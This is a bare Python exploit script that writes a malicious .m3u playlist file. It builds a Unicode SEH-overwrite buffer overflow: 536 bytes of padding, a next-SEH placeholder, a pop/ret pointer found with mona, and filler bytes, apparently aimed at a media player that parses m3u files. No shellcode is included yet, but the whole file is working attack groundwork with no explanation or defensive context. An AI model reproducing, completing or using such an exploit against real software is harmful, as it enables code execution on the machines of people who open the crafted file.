#mona seh -cp unicode
# pop ebx # ret 0x04 | 0x004100f2

buffer = "A"*536 + "BB" +"\xf2\x41" + "X" * 2864
f = open('file5.m3u','w')
f.write(buffer)
f.close()
